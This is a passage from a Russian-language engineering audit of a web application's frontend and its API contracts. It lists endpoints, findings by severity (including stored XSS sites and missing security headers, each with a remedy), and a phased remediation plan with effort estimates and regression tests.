| GET | `/auth/me` | нет | — | да (`auth.js:134`) |
| GET | `/auth/validate` | да | — | **НЕТ** (orphan) |
| GET | `/system/health` | нет | — | НЕТ (для LB) |
| GET | `/system/health/detailed` | нет | — | НЕТ |
| GET | `/system/health/detailed/full` | да | — | НЕТ |
| GET | `/system/health/{domain_name}` | нет | — | НЕТ |
| GET | `/system/version` | нет | — | **НЕТ** (должно быть в UI — см. §13.3) |
| GET | `/roles/my-roles` | да | — | да (`api.js:936`) |
| GET | `/admin/diagnostics` | да | Админ | **НЕТ** (должно быть в admin-панели) |

#### Acts (24 endpoints)

Полный список — см. NEW-5 §K. Ключевые:
- `GET /acts/list`, `POST /lock`, `POST /unlock`, `POST /extend-lock`, `POST /create`, `GET /config/{lock,invoice}`, `GET/PATCH /{id}`, `POST /{id}/duplicate`, `POST /{id}/audit-point-ids`, `DELETE /{id}`, `GET/PUT /{id}/content`, `GET /{id}/invoices` (orphan!), `POST /export/save-act`, `GET /export/download/{filename}`, `GET /invoice/{metrics,processes,subsidiaries,tables/{db_type}}`, `POST /invoice/{save,verify}`, `GET /{id}/{audit-log,versions,versions/{vid}}`, `POST /{id}/versions/{vid}/restore`, `GET /users/search` (без auth — N7).

#### Admin (7)

См. §11.1.

#### Chat (11)

- `POST /conversations`, `GET /conversations`, `GET /conversations/{id}` (orphan), `PATCH /conversations/{id}` (**orphan** — UI кнопки переименования нет), `DELETE /conversations/{id}`, `POST /conversations/{id}/messages` (SSE), `GET /conversations/{id}/messages`, `GET /conversations/{id}/active-forward`, `GET /conversations/{id}/forward-stream/{rid}` (SSE Resume), `GET /limits`, `GET /files/{file_id}`.

#### CK (12)

См. §11.2.

### 14.2 Orphan endpoints — 11 из 53 (~21 %)

**Кандидаты «подключить в UI»:**
1. `GET /api/v1/system/version` → UI (см. §13.3)
2. `GET /api/v1/admin/diagnostics` → admin-панель
3. `GET /api/v1/admin/audit-log` → admin-панель (UI журнала операций админа)
4. `GET /api/v1/acts/{id}/invoices` → constructor/preview (проверить use-case)
5. `PATCH /api/v1/chat/conversations/{id}` → кнопка «переименовать чат» в `chat-history`

**Оставить как внешние/служебные:** `/auth/validate`, 4 `/system/health*`, `GET /chat/conversations/{id}`.

### 14.3 Orphan frontend calls — 0

Все URL из `getUrl('/api/v1/...')` в `static/js/` сматчены с endpoints. Direct relative-path fetches — 0 (`grep "fetch(\s*['\"]/api"` → 0).

**Но: 1 BUG двойного `getUrl()`** в `dialog-create-act.js:1378` — см. C-URL×2 в §5.

### 14.4 [MEDIUM] CONTRACT-LIST — Response shape для list-endpoints несогласован

| Endpoint | Shape |
|---|---|
| `GET /acts/{id}/audit-log` | `{items, total}` |
| `GET /acts/{id}/versions` | `{items, total}` |
| `GET /admin/audit-log` | `{items, total}` |
| `GET /chat/conversations` | `list[...]` (без total) |
| `GET /chat/conversations/{id}/messages` | `list[...]` (без total) |
| `POST /ck-*/records/search` | `{data}` (без total) |
| `GET /acts/users/search` | `list[...]` |
| `GET /acts/list` | `list[...]` |

**Fix:** соглашение «все list-endpoints возвращают `{items, total, limit, offset}`», задокументировать в developer-guide.

### 14.5 [MEDIUM] CONTRACT-LIMITS — Pagination limits разные

- audit-log/versions: 1..**2000**
- admin/audit-log: 1..**200**
- chat/conversations: 1..**200**
- chat/messages: 1..**500**

Без видимой системы.

### 14.6 [MEDIUM] CONTRACT-ERROR — Error response envelope несогласован

- FastAPI default: `{"detail": "..."}`
- Domain errors: `exc.to_detail()` — гибкий dict, поля разные для разных подклассов
- Kerberos: специальная структура `{error, detail, message, instructions[], action_required}`

Фронт парсит неоднородно: некоторые места ждут `errData.detail`, другие — `errData.type === 'km_exists'`.

**Fix:** ввести envelope `{detail: string, code: string, ...extra}`, фронт переключается по `code`. ~3-4 дня рефакторинга.

### 14.7 Schema mismatches

Полная проверка требует runtime. Статический анализ — 0 явных, но риск drift'а везде где нет contract-тестов.

**Fix:** пара unit-тестов «golden contract» — фронт-payload → pydantic-валидация на бэке. Если фронт изменил поля — тест падает. Эффорт: 1ч на самый load-bearing endpoint (`/acts/create`).

### 14.8 SSE и Bulk

- **SSE**: 2 endpoint'а (POST messages, GET forward-stream), оба требуют `require_domain_access("chat")` + ownership.
- **Bulk**: 2 endpoint'а (CK records/batch-update, max 500 items). `acts/{id}/audit-point-ids` без явного лимита — рекомендуется добавить `MAX_BATCH_SIZE = 200`.

---

# Часть III. Сводный анализ

## §15. Все находки по severity

### 15.1 CRITICAL (7)

| ID | Зона | Файл | Заголовок | Effort |
|---|---|---|---|---|
| C-XSS-1 | Security | `textblock-editor.js:27` | Stored XSS через textBlock.content | M / 4-8ч |
| C-XSS-2 | Security | `preview-violation-renderer.js:183` | Stored XSS в preview через violation-fields | S / 1-2ч |
| C-PROXY | State | `state-core.js:518-538` | Proxy ловит только верхний уровень — ~92% правок не помечают dirty | L / 16-24ч |
| C-RESTORE | State | `storage-manager.js:100-167` | `restoreSavedState()` — мёртвый метод | S / 2ч |
| C-PATCH×2 | Acts Manager | `acts-manager-page.js:496-535` | Двойной PATCH при сохранении метаданных | XS / 1 строка |
| C-URL×2 | Acts Manager | `dialog-create-act.js:1378` | Двойной getUrl — битый URL при «новой части» | XS / 1 строка |
| C-LOCK | Acts Manager | `version-preview.js:288-323` | VersionPreviewOverlay ломает lock AuditLogDialog | XS / удалить 4 строки |

### 15.2 HIGH (16)

| ID | Зона | Файл | Заголовок | Effort |
|---|---|---|---|---|
| H-RENDERALL | Архитектура | `items-renderer.js:13` | Монолитная перерисовка step 2 (14 call-sites) | S→L (по фазам) |
| H-SCRIPTS | Performance | `base_constructor.html` | 72 `<script>` без defer под HTTP/1.1 → 600-1200мс белого экрана | S (defer) |
| H-PREVIEW | UX | `preview.js`, `preview-menu.js:345` | RAF без de-dup + мёртвый listener app:state-changed | S |
| H-EXTEND | State | `lock-manager.js:222-308` | Одна сетевая ошибка extend → принудительный logout | M |
| H-NAV | State | `storage-manager.js:269-337` | Navigation interception обходится window.location.href, popstate | M |
| H-HEADERS | Security | `app/main.py`, middleware | Нет CSP/X-Frame/HSTS/nosniff | S / 2-4ч |
| H-BOUNDARY | Error handling | глобально | Нет window.onerror / unhandledrejection | XS |
| H-TIMEOUT | Error handling | `api.js` | Нет fetch timeout (AbortController) | S |
| H-422 | Error handling | `api.js` | 422-ответ = `[object Object]` | S |
| H-A11Y-TREE | a11y | tree templates + JS | Tree без ARIA и keyboard nav | L |
| H-A11Y-DIALOGS | a11y | `dialog-base.js:34-71` | Диалоги без focus-management/trap/aria-modal | M |
| H-A11Y-LIVE | a11y | `notifications.js`, save-indicator | Без aria-live | XS |
| H-A11Y-MOTION | a11y | глобально | prefers-reduced-motion=0 вхождений | XS |
| H-A11Y-TABLE | a11y | `table-core.js` | Без grid-семантики, клавиатуры ячеек | L |
| H-CACHE | Build | base templates | Cache-busting не настроен — Ctrl+F5 после деплоя | S / 1-2ч |
| CSS-VARS-BROKEN | CSS | `chat.css`, `sidebar.css`, `landing.css` | --duration-fast/normal undefined (29 occurrences) | XS |
| H2 | Шаблоны | `base_constructor.html:80-81, 155-160` | Дублирующие portal-партиалы | S |
| H4 | State | `lock-manager.js:261-267` | Activity-listeners без removeEventListener | S |
| H5-A | UX | `app.js:149` | Ctrl+S во время editing сохраняет неактуальное состояние | M |
| H6-A | UX | `violation-core.js`, `items-title-editing.js` | Preview rebuild на каждый input (60 fps) | S |
| H7-A | UX | `context-menu-cells.js:783-803` | Магический setTimeout(50) | S |
| H10 | Acts Manager | `dialog-create-act.js:61,157` | `window.env` vs `AuthManager.getCurrentUser()` | S |
| H12 | Shared | 5 chat-модулей | Hardcoded `/api/v1/chat/...` (9 occurrences) | S |
| H-N1-UX | UX | `app.js:127` | forceSave не блокирует двойной POST | S |
| H-N8-UX | UX | `notifications.js` | Нет лимита, при шторме DOM лагает | S |
| H-N3-ACTS | Acts Manager | `acts-manager-page.js:551-660` | Нет cross-tab инвалидации после delete/duplicate | M |
| H-XSS-1 | Security | `diff-renderer.js:198,200,209,211` | XSS в diff-режиме | S |
| H-XSS-3 | Security | `preview-textblock-renderer.js:41` | XSS в preview-textblock | S |
| H-SILENT-1 | Error handling | `version-preview.js:305` | Silent `unlockAct().catch(()=>{})` | XS |
| H-SILENT-2 | Error handling | `api.js:472-475` | `_saveDefaultStructure` silent fail | S |
| A1 | Admin | `admin/routes/portal.py:15-34` | Серверный gate на /admin отсутствует | S |
| C1 (CK) | CK | ck-client-exp / ck-fin-res page.js | 386 строк дублирования | M |

### 15.3 MEDIUM (35) — выдержка

| Группа | Пример |
|---|---|
| Persistence | M2 (dirty/clean дубль), M3 (несимметричные beforeunload), N-LS-PREFIX (LS без actId), N7 (Race init), N8 (ChangelogTracker switch), N5 (двойной PUT при exit), M11 (read-only disabled), L3 (магические задержки), N-DUP-ID (дубль id) |
| Tree | M5 (нумерация дубль), M6 (cross-zone TB-sync), M8 (магические строки nodeTypes), M9 (deleteNode без protected check), E-1 (node.tb 3 пути), E-2 (isPinnedTable асимметрия), E-3 (cascade logic 4 файла) |
| UX | M10 (Help vs Dialog hierarchy), M12 (нет sync preview vs side-panel), N2 (acts cache 1 мин), N6 (exit race), N7 (InvoiceDialog leak) |
| Acts Manager | M13 (FilterEngine), M14 (currentActId), M15 (silent fill), M16 (нет debounce), N4 (chain перехватов), N6 (backend pre-save restore), N7 (users/search без auth), G.4 (silent fail AuditLog locked) |
| Security | M-ESC-1/2, M-OPEN-REDIR, M-LS-EXPOSE |
| CSS | CSS-VARS-SWAMP, CSS-Z-INDEX-CALC, CSS-RESPONSIVE |
| Shared | M17/M18 (chat listeners), M19, M20 (NotificationManager) |
| Admin/CK | A2 (error разводка), A3 (rollback), C2-C6 (пагинация, validation, empty-state) |
| Error handling | H6 (rollback message), H7-H10 (silent fails) |
| Contracts | CONTRACT-LIST (list shape), CONTRACT-LIMITS, CONTRACT-ERROR (envelope) |

### 15.4 LOW (~25) и INFO

Перечень — см. оригинальный as-is §7.3 (актуален) + дополнения новых агентов:
- CSS-TRANSITION-ALL (38 occurrences)
- L7 verifyInvoice заглушка
- L8 silent fail справочников Invoice
- L9 множественные Escape-listeners (9)
- L12, L13 DialogBase issues
- N-BLOCK-3 KNOWN_BLOCK_TYPES третий источник
- A4, A5 (admin search edge cases)
- A6 chip.title без escape
- A7 admin scripts без defer
- C7-C14 (CK косметика)
- I-CONSOLE, I-DOM-FB (info)

---

## §16. Карта рисков по типу

### Архитектурные
**Корень:** H-RENDERALL (`ItemsRenderer.renderAll()` — 14 call-sites). За ним — M5 (нумерация дубль), M6 (TreeRenderer→ItemsRenderer), M7 (dead-parameter), M8 (магические строки), M9 (защита деления).

**Связи:** Per-node updateNode разом решит H-RENDERALL + большую часть H6-A (preview cost ↓ если убрать ненужные триггеры) + позволит сохранить фокус при структурных операциях.

### Потеря данных
- **C-PROXY** — ~92% правок не помечают dirty, autosave не работает.
- **C-RESTORE** — fallback на LS не работает.
- **N-NAV** — программная навигация обходит intercept.
- **N5** — двойной PUT при exit.
- **H-EXTEND** — потеря сессии при одной сетевой ошибке.
- **N6 backend** — lost write при restore.

### Безопасность
- **C-XSS-1/2** + **H-XSS-1/3** — XSS-вектор через `textBlock.content` и preview.
- **H-HEADERS** — отсутствие CSP усиливает все XSS до full exec.
- **M-OPEN-REDIR** — open-redirect через client-action open_url.
- **N7 backend** — users/search без auth.

### Acts Manager (критические баги UI)
- **C-PATCH×2** — двойной PATCH.
- **C-URL×2** — битый URL «новой части».
- **C-LOCK** — VersionPreviewOverlay ломает lock.
- **H-N3-ACTS** — нет cross-tab инвалидации.

### Performance
- **H-RENDERALL** — корень.
- **H-SCRIPTS** — 72 скрипта без defer.
- **H6-A / H-PREVIEW** — RAF без de-dup.
- **C-PROXY** — побочно: ручной markAsUnsaved spam при текущем подходе.

### Cross-domain / proxy / JupyterHub
- **H2** — портальные включения в конструкторе.
- **C-URL×2** — двойное обёртывание getUrl.
- **H12** — hardcoded chat endpoints.
- **H-CACHE** — рассинхрон HTML/JS после деплоя под proxy.

### Accessibility
- **H-A11Y-TREE/TABLE/DIALOGS/LIVE/MOTION** — основной рабочий компонент полностью мышиный, screen-reader не работает.

### Error handling
- **H-BOUNDARY** — нет глобального error handler.
- **H-TIMEOUT** — нет fetch timeout.
- **H-422** — нечитаемые validation errors.
- **H-SILENT-1/2** — критичные silent fails.

---

## §17. Plan of action

Рекомендация — **три волны**, каждая с чётким DOD (definition of done).

### Wave 1 (Security & Data Loss) — 1-1.5 спринта

**Цель:** закрыть CRITICAL/HIGH security и потерю данных. Минимум визуальных изменений, максимум фикса.

**Задачи:**
1. **C-XSS-1/2 + H-XSS-1/3** — обернуть `innerHTML` через DOMPurify (фронт), добавить `bleach.clean` в `ActContentService.save_content` (бэк). ~2 дня.
2. **H-HEADERS** — `SecurityHeadersMiddleware` с CSP в режиме `report-only` сначала, через 1 спринт переключить на enforce. ~0.5 дня.
3. **C-PATCH×2** + **C-URL×2** + **C-LOCK** — три точечных фикса в Acts Manager. ~0.5 дня.
4. **C-PROXY** — краткосрочно ручные `markAsUnsaved()` в ~50 мест мутаций; долгосрочно recursive Proxy. Фикс ручной — ~1.5 дня, recursive — отдельным PR.
5. **C-RESTORE** — решить судьбу `restoreSavedState`: либо удалить (200+ строк мёртвого кода), либо вызывать как fallback. ~0.5 дня.
6. **H-EXTEND** — retry с MAX_FAILURES=3. ~0.5 дня.
7. **H-NAV** — `confirmNavigation()` helper вместо прямых `window.location.href` + popstate handler. ~1 день.
8. **N7 backend** — `Depends(get_username)` на `/api/v1/acts/users/search`. ~30 мин.
9. **H-A11Y-LIVE** — `aria-live="polite"` на notification-container, save-indicator. ~30 мин.
10. **H-A11Y-MOTION** — один media-query для `prefers-reduced-motion`. ~10 мин.

**DOD:** все CRITICAL закрыты, security headers в проде, autosave фактически работает, navigation interception покрывает программные пути.

**Тесты:**
- `tests/security/test_xss_act_content.py` — XSS payload не проходит save.
- `tests/security/test_security_headers.py` — CSP/X-Frame/nosniff на ключевых URL.
- `tests/acts/test_create_with_new_part.py` — С URL×2 регрессия.
- `tests/acts/test_metadata_edit_idempotent.py` — C-PATCH×2 регрессия (один PATCH на одно нажатие).

### Wave 2 (Architecture & Performance) — 2-3 недели

**Цель:** разнести `renderAll()` на per-node + квик-вины по performance + UX-фиксы.

**Перед началом:**
- Завести минимальный Playwright smoke (5-6 сценариев: открыть акт, добавить узел, edit ячейку, drag-drop, save). Без него Wave 2 рискованна.
- Verify M7 (cleanup metrics) и E-5/E-6 (drag race) руками — 5 минут.
- Решить design TreeRenderer→ItemsRenderer (event-bus / DI / оставить с публичным API). См. C-3 в §3.

**Phase 2.1 (S, 1 день):** заменить 8 call-sites в `table-cells-operations.js` на `ItemsRenderer.renderSingleTable(tableId)` — метод уже существует. Это сразу снимает 57% renderAll.

**Phase 2.2 (M, 2-3 дня):** реализовать `ItemsRenderer.updateNode/removeNode/insertNode` + `TableManager.attachEventListenersWithin(rootEl)`. Заменить call-sites #4-5 (tree-drag-drop, context-menu-tree).

**Phase 2.3 (S):** убрать renderAll из `restoreTableSizes` (context-menu-cells.js:785).

**Phase 2.4 (S):** дедупликация RAF в `PreviewManager.update`, удаление мёртвого `app:state-changed` listener'а, debounce 150мс для preview.

**Phase 2.5 (S, параллельно):** `defer` на все 72 `<script>`, `{passive: true}` на mouse/scroll/touch listener'ы.

**Phase 2.6 (1-2 дня, опционально):** Lazy-load chat-popup, invoice dialog, help. Cache-busting Вариант 1.

**DOD:** правка violation textarea не теряет фокус при drag-drop в дереве; preview не лагает при наборе; cold-load < 700 мс на JupyterHub.

### Wave 3 (Polish & a11y) — 1-2 недели

**Цель:** базовый a11y, error handling boundary, CSS гигиена, чистка dead code.

**Задачи:**
1. **H-A11Y-TREE** — APG Treeview pattern + roving tabindex. ~3-4 дня.
2. **H-A11Y-DIALOGS** — focus-management в `DialogBase` + `aria-modal` + focus-trap. ~1 день.
3. **H-A11Y-TABLE** — `role="grid"` + keyboard navigation для ячеек. ~2-3 дня.
4. **H-BOUNDARY + H-TIMEOUT + H-422** — единый `shared/error-boundary.js` + `apiFetch` wrapper + 422 formatter. ~1 день.
5. **CSS-VARS-BROKEN** — добавить `--duration-fast/normal`. ~10 мин.
6. **CSS-VARS-SWAMP** — декомпозиция `variables.css`. ~1-2 дня (косметика, можно отложить).
7. **CSS-Z-INDEX-CALC** — заменить `calc()` на `--z-modal + 1` или новый токен. ~30 мин.
8. **M8** — магические строки nodeTypes → `AppConfig.nodeTypes.*`. ~0.5 дня.
9. **L1, L4, L7, L12, L13** — точечная чистка. ~0.5 дня.
10. **C1 (CK)** — вынести `CkPage` базовый класс. ~0.5 дня.
11. **A1** — `Depends(require_admin())` на HTML-роут /admin. ~10 мин.
12. **N-DUP-ID** — переименовать дублирующий id. ~10 мин.

**DOD:** скринридер может пройти основной flow (открыть акт, посмотреть дерево, открыть диалог); все CRITICAL/HIGH из аудита закрыты; CK дубликат удалён.

### Wave 4 (Дальнейшее) — по мере необходимости

- **Wave 2.7:** bundling через esbuild (вариант (a) — простая конкатенация с сохранением `window.X`). 12 RTT → 2-3 RTT под HTTP/1.1.
- **Backend response envelope унификация** (CONTRACT-ERROR + CONTRACT-LIST).
- **Дельта-сериализация для localStorage** или переход на IndexedDB.
- **Подключить /admin/diagnostics + /admin/audit-log в UI** (orphan endpoints).
- **WebSocket/SSE для cross-tab инвалидации** acts list.
- **Frontend error tracking endpoint** (`POST /api/v1/system/client-error`).
- **CI/CD pipeline** — `.github/workflows/test.yml`.
- **Decomposition `variables.css`** в отдельные модули.

---

## §18. Что НЕ покрыто этим документом

- **Реальный профайл** под Chrome DevTools Performance / Lighthouse. Все цифры — расчётные.
- **Сетевой профайл** под фактическим RTT и bandwidth JupyterHub. Деплой может оказаться быстрее или медленнее моих оценок.
- **Memory snapshot** в течение длинной сессии (1+ час). Подтвердит/опровергнет потенциальную утечку `ViolationManager.activeViolations`.
- **Реальная частота `markAsUnsaved`** при активном вводе — нужен trace для подтверждения масштаба C-PROXY.
- **Стоимость chat-renderer** на длинных markdown'ах — нужен профайл с реальным LLM-response.
- **Server-side бэкенд-эндпоинты как таковые** — только их вызов с фронта + точечные find'ы (N6, N7).
- **Chat-домен внутри** — только верхний уровень (см. `docs/chat-frontend-architecture.md`).
- **Generation/export** (acts/export/...) — упомянуто пунктирно.
- **Validation domain детально** — только в карте модулей.
- **Greenplum compatibility** на фронте не пересекается; backend GP-particulars — see CLAUDE.md.
- **Полный security-audit бэкенда** (SSRF, SQL injection, race conditions transactions) — отдельная задача.
- **i18n** — приложение русское-only, переводы не планируются.
- **Browser compatibility** (только Chromium-based предполагается).
- **Mobile/планшетная поддержка** — Constructor десктоп-only (см. §9.7).

Всё перечисленное — **обязательная верификация** перед фиксом любого пункта Wave 1-4. «Зацени, как код выглядит» — это **не профайл**.

---

## Приложение: индекс по агентам

Полные отчёты каждого агента сохранены в `docs/_frontend_review/` (10 файлов, ~5500 строк суммарно):

| Файл | Зона |
|---|---|
| `ver-1-templates-shared.md` | §1 Шаблоны + §6 Shared (VER-1) |
| `ver-2-state-persistence.md` | §2 State + Persistence (VER-2) |
| `ver-3-tree-isolation.md` | §3 Tree + Isolation (VER-3) — ключевая зона |
| `ver-4-ux-shell.md` | §4 UX shell (VER-4) |
| `ver-5-acts-manager.md` | §5 Acts Manager (VER-5) |
| `new-1-security.md` | §7 Security (NEW-1) |
| `new-2-performance.md` | §8 Performance (NEW-2) |
| `new-3-css-a11y.md` | §9 CSS + §10 a11y (NEW-3) |
| `new-4-admin-ck-errors.md` | §11 Admin/CK + §12 Error handling (NEW-4) |
| `new-5-build-contracts.md` | §13 Build/Deploy + §14 Backend contracts (NEW-5) |

Можно удалить после ревью (рабочие артефакты).

---

**Итого по аудиту:**
- **92 находки**: 7 CRITICAL + 30+ HIGH + 35+ MEDIUM + 25+ LOW + INFO
- **Подтверждено**: 41 находка из исходного аудита
- **Опровергнуто**: 4 (H11, L4 частично, L5, L10, L11)
- **Новых**: 51 находка по 10 зонам

**Главный архитектурный долг**: H-RENDERALL — `ItemsRenderer.renderAll()`.
**Главный риск потери данных**: C-PROXY — Proxy ловит только верхний уровень.
**Главный security-риск**: C-XSS-1/2 + H-HEADERS — stored XSS без CSP.
**Главный UX-баг**: правка violation теряет фокус при drag-drop в дереве (следствие H-RENDERALL).


